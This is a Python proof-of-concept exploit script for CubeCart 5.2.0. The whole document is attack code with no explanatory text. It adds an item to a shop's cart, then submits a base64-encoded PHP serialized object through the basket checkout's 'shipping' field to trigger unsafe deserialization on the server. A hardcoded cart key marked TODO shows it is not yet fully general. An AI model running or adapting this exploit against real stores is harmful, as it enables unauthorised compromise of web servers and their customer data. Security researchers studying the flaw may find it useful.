# Cubecart (5.2.0) - PoC
import requests
import sys
import base64
from bs4 import BeautifulSoup

def printUsageAndExit():
    print("[#] Usage: python [BASEURL]")
    exit()

def addCart(baseurl):
    URL = "{}{}".format(baseurl, "/index.php?_g=ajaxadd")
    with requests.Session() as session:
        idx_req = session.get(baseurl)
        soup = BeautifulSoup(idx_req.text, features="html.parser")
        prod_idx = soup.find("input", {"name": "add", "type": "hidden"})['value']

        cart_data = {
                "add": str(prod_idx)
                }
        r = session.post(URL, data = cart_data)
        if(r.text.find("product_id={}".format(prod_idx)) == -1):
            print("[!] Addcart Failed!");
            exit()
        else:
            return session

if __name__ != '__main__':
    exit()

if(len(sys.argv) < 2):
    printUsageAndExit()

BASEURL = sys.argv[1]

# Get token
session = addCart(BASEURL)

TRIGGER_INPUT = 'O:17:"dummy_class_r353t":1:{s:12:"used_methods";a:0:{}}'
PAYLOAD = {
    "quan[db2dee7afed9e264003941e5bd471ac6]": (None, "1"), # TODO: Need to be change dynamically
    "shipping": (None, base64.b64encode(TRIGGER_INPUT.encode("ascii"))),
    "coupon": (None, ""),
    "proceed": (None, "Checkout")
}


# Submit PAYLOAD
poc_req = session.post("{}{}".format(BASEURL, "/index.php?_a=basket"),
                        files = PAYLOAD)

# print(poc_req.text)
